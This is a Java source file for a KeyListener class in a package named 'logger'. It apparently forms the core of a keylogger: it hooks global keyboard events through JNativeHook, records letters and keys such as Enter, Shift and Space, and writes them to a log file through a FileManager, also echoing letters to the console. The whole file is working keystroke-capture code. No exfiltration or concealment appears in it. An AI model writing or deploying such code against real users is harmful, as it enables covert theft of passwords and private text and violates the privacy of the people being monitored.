package dev.source.logger;

import java.io.IOException;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyListener implements NativeKeyListener, AutoCloseable {
	private FileManager fileManager;

	public KeyListener() throws IOException {
		fileManager = FileManager.getInstance();
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
		if (isAction(keyEvent.getKeyCode())) {
			String actionAsString = ("[" + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()) + "]");
			fileManager.log(actionAsString.toUpperCase());
		}
		if (isLetter(keyEvent.getKeyCode())) {
			fileManager.log(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
			System.out.println(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
		}
		switch (keyEvent.getKeyCode()) {
		case NativeKeyEvent.VC_MINUS:
			fileManager.log("-");
			break;
		case NativeKeyEvent.VC_UNDERSCORE:
			fileManager.log("_");
			break;
		}
	}

	private boolean isAction(int keyCode) {
		if (keyCode == NativeKeyEvent.VC_SHIFT || keyCode == NativeKeyEvent.VC_ENTER
				|| keyCode == NativeKeyEvent.VC_SPACE || keyCode == NativeKeyEvent.VC_CAPS_LOCK) {
			return true;
		}
		return false;
	}

	private boolean isLetter(int keyCode) {
		if (keyCode == NativeKeyEvent.VC_A || keyCode == NativeKeyEvent.VC_B || keyCode == NativeKeyEvent.VC_C
				|| keyCode == NativeKeyEvent.VC_D || keyCode == NativeKeyEvent.VC_E || keyCode == NativeKeyEvent.VC_F
				|| keyCode == NativeKeyEvent.VC_G || keyCode == NativeKeyEvent.VC_H || keyCode == NativeKeyEvent.VC_I
				|| keyCode == NativeKeyEvent.VC_J || keyCode == NativeKeyEvent.VC_K || keyCode == NativeKeyEvent.VC_L
				|| keyCode == NativeKeyEvent.VC_M || keyCode == NativeKeyEvent.VC_N || keyCode == NativeKeyEvent.VC_O
				|| keyCode == NativeKeyEvent.VC_P || keyCode == NativeKeyEvent.VC_Q || keyCode == NativeKeyEvent.VC_R
				|| keyCode == NativeKeyEvent.VC_S || keyCode == NativeKeyEvent.VC_T || keyCode == NativeKeyEvent.VC_U
				|| keyCode == NativeKeyEvent.VC_V || keyCode == NativeKeyEvent.VC_W || keyCode == NativeKeyEvent.VC_X
				|| keyCode == NativeKeyEvent.VC_Y || keyCode == NativeKeyEvent.VC_Z) {
			return true;
		}
		return false;
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent keyEvent) {
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent keyEvent) {
	}

	@Override
	public void close() throws Exception {
		fileManager.close();
	}
}
